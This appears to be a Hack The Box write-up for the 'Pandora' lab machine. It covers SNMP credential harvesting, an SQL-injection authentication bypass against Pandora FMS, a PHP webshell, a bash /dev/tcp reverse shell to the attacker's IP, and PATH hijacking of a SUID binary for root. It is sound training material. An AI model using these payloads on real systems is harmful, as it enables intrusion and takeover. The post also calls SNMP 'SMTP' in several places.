---
layout: single
title: pandora - Hack The Box
excerpt: "Pandora is considered an easy linux machine from HTB in which the initial scanner didnt showed much more than a hosting template web page and ssh open. To gather more information we continue to scan UDP ports until we find port 161 open which was running and SMTP service. From there we got some creds and login into the machine to realize that it was running a web service under localhost. Then We encounter a Pandora FMS console that give us access to the machine as the user Matt and then with a binary with SUID privileges we got access to root user."
date: 2022-12-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-Pandora/Pandora-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - easy
  - Linux
  - Pandora FMS
  - udp
  - suid
  - SQL Injection


---
![](/assets/images/htb-writeup-Pandora/Pandora-logo.png)

### Machine IP = 10.10.11.136


## Port Scan 
we start with our usual NMAP scan:
* sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.136

```
# Nmap 7.92 scan initiated Fri Dec  9 08:14:08 2022 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.136
Nmap scan report for 10.10.11.136
Host is up, received echo-reply ttl 63 (0.10s latency).
Scanned at 2022-12-09 08:14:09 EST for 76s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs=
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w=
|   256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 115E49F9A03BB97DEB840A3FE185434C
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Dec  9 08:15:25 2022 -- 1 IP address (1 host up) scanned in 77.33 seconds

```

## Enumeration

Since we only find 2 ports, we will start with port 80 and go to http://10.10.11.136

![](/assets/images/htb-writeup-Pandora/pandora1.png)

We find that they reffer to **panda.htb** and we add it /etc/hosts and then navigate to [http://panda.htb](http://panda.htb). But we get the same page.

After some extra enumeration I did not find anything interesting so I continue to perferm a ***UDP*** scan:
* sudo nmap -sU -sV -vvv panda.htb

![](/assets/images/htb-writeup-Pandora/pandora2.png)

I found that it is running port 161 with SMTP enabled, and i found some credentials:

* snmpwalk -c public -v1 10.10.11.136 > smtp.txt
* smtp.txt | grep daniel

![](/assets/images/htb-writeup-Pandora/pandora3.png)


## Gaining foothold
We test the credentials found on SMTP. I got access on ssh (***port 22***) and create a Dynamic port in case just in case I need it.
 * ssh -D 1234 daniel@10.10.11.136

 ![](/assets/images/htb-writeup-Pandora/pandora5.png)

## Enumeration for privilege escalation

I check daniel privileges and permisions but i did not find anything interesting. So I decide to look for the web page that was on port 80 to see if I can find something interesting and we find "another" web server that could potentially be active

![](/assets/images/htb-writeup-Pandora/pandora6.png)

I decide to check the network and find that there is running a web service on the localhost of the machine

![](/assets/images/htb-writeup-Pandora/pandora4.png)

I got to localhost in my machine and it redirects me to http://localhost/pandora_console/


![](/assets/images/htb-writeup-Pandora/pandora7.png)

## Gaining Access to Pandora Console
I find a vulnerability on "***Pandora FMS -v7.0NG.742_FIX_PERL2020***" related to admin access unauthentificated.
I tried some scripts but none of them worked so I just took a closer look at this [GitHub Repo](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)

reading the code, they show the original code injection:

```
#Exploit Injection
http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
```


I just go to "***http://localhost/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO'***" on my browser and it shows me a blank page.
Then I go back to http://localhost/pandora_console and we are in as admin

![](/assets/images/htb-writeup-Pandora/pandora8.png)

## Gaining Shell
After looking the page for a while I get to a "file explorer" in which I'm aviliable to upload files.

I create a new file named **rev.php** which is going to be a webshell

### rev.php:
```
<?php echo "<pre>".shell_exec($_REQUEST[cmd])."<pre>"; ?>

```

Next I go to http://localhost/pandora_console/images/w1nz/rev.php?cmd="**COMMAND**"


![](/assets/images/htb-writeup-Pandora/pandora9.png)

To gain shell we just need to activate nc to receive connection
- sudo nc -nlvp 443

We need to URL encode the following code:
```
bash -c "bash -i >& /dev/tcp/10.10.14.4/443 0>&1"

```
- bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.4%2F443%200%3E%261%22


![](/assets/images/htb-writeup-Pandora/pandora10.png)

## Privilege Escalation
First we get a better shell that give us full capacity to work. I go to matt /home directory and created the .ssh folder and type the following command:
- ssh-keygen

![](/assets/images/htb-writeup-Pandora/pandora12.png)

You press enter until it finishes and you two files:
    -   id_rsa
    -   id_rsa.pub
We create a copy of id_rsa.pub, name it authorized_keys and sit the file as only readable and writable by the owner(Matt).

![](/assets/images/htb-writeup-Pandora/pandora13.png)

I check matt permissions and I found one binary named "***pandora_backup*** 
![](/assets/images/htb-writeup-Pandora/pandora11.png)


After checking that file we realize that we have some special permisions that let us run as if we are root

![](/assets/images/htb-writeup-Pandora/pandora14.png)

I try to use **strings** to get some extra information about the binary but as the machine did not have it I had to use ltrace which it did show me some useful information 

![](/assets/images/htb-writeup-Pandora/pandora15.png)

We can see that the program is using tar but not the complete path, that means we can "highjack" that path and create a program named ***tar*** and make it do something we want like:
* /usr/bin/sh


To do this we go to a folder create the file and then add that to the begining to the PATH variable that the system has. After creating the file we just add the path to the **PATH** system variable 

![](/assets/images/htb-writeup-Pandora/pandora16.png)

Finally we just need to run the pandora_backupfile and we will be root.
![](/assets/images/htb-writeup-Pandora/pandora17.png)